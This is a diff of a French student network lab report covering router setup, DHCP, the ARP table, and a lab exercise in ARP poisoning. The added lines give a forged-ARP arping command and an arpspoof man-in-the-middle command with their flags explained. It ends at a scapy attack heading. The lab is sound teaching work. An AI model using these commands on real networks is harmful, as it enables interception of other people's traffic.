@@ -10,7 +10,7 @@ pour ce faire on défini un hostname avec la commande :
 
 - sudo hostnamectl set-hostname router.tp2.efrei
 
-Puis pour éviter que le firewall rejette les paquets IPs qui ne lui sont pas destinés on exécute la command : 
+Puis pour éviter que le firewall rejette les paquets IPs qui ne lui sont pas destinés on exécute la commande : 
 
 - sudo firewall-cmd --add-masquerade
 
@@ -19,7 +19,7 @@ Enfin la commande pour que ce paramètre persiste :
 - sudo firewall-cmd --add-maquerade --permanent 
 
 
-Ensuite, on attribue un IP statique à la machine : 
+Ensuite, on attribue une IP statique à la machine : 
 
 - sudo nano /etc/sysconfig/network-scripts/ifcfg-enp0s3
 
@@ -120,13 +120,14 @@ trace to 1.1.1.1, 8 hops max, press Ctrl+C to stop
  7     *  *  *
  8     *  *  *
 
-On voi bien que la première adresse IP est celle du routeur, donc les paquets passent par le routeur.
+On voit bien que la première adresse IP est celle du routeur, donc les paquets passent par le routeur.
 
 **Afficher la CAM Table du switch**
 
 La CAM table contient les infos de node1 branché sur le port Et 0/0
 
-show mac address-table
+- show mac address-table
+
           Mac Address Table
 -------------------------------------------
 
@@ -140,10 +141,12 @@ Total Mac Addresses for this criterion: 2
 
 **Install et conf du DHCP**
 
-Tout d'abord on attribue un IP statique à la machine : 
+Tout d'abord on attribue une IP statique à la machine : 
 
 - sudo nano /etc/sysconfig/network-scripts/ifcfg-enp0s3
+
 - on rentre les infos suivantes :
+
 ```
 DEVICE=enp0s3;
 NAME=lan;
@@ -234,6 +237,7 @@ LPORT       : 20006
 RHOST:PORT  : 127.0.0.1:20007
 MTU         : 1500
 
+On voit que le DNS est bien renseigné.
 
 **Wireshark it !**
 
@@ -245,14 +249,43 @@ MTU         : 1500
 
 **Affichez la table ARP de `router.tp2.efrei`**
 
+Pour afficher la table ARP du routeur on exécute la commande :
+
+- ip n s
+
+10.2.1.11 dev enp0s8 lladdr 00:50:79:66:68:00 STALE 
+10.2.1.253 dev enp0s8 lladdr 08:00:27:5e:90:c2 STALE 
+
 **Capturez l'échange ARP avec Wireshark**
+
+[ARP](capture/ARP.pcapng)
 
 ### 2. ARP Poisoning
 
 **Envoyez une trame ARP arbitraire**
 
+Depuis la kali on entre la commande :
+
+- sudo arping -s 11:11:11:11:11:11 -S 10.2.1.254 10.2.1.11
+
+résultat dans la table arp de node1 :
+
+- show arp
+
+11:11:11:11:11:11  10.2.1.254 expires in 101 seconds 
+
 **Mettre en place un ARP MITM**
 
+Pour faire un MiTM on tape la commande :
+
+- sudo arpspoof -i eth0 -t 10.2.1.11 -r 10.2.1.254
+
+ici -i : interface de la carte réseau du pc attaquant
+ensuite -t : t pour target et on rentre l'IP de la machine visée
+enfin -r : pour empoisonner à la fois la victime et la machine à laquelle elle se connecte et ainsi capturer le traffic dans les deux sens
+
 **Capture Wireshark `arp_mitm.pcap`**
+
+[ARP spoofing](capture/ARP_spoof.pcapng)
 
 **Réaliser une attaque avec scapy**
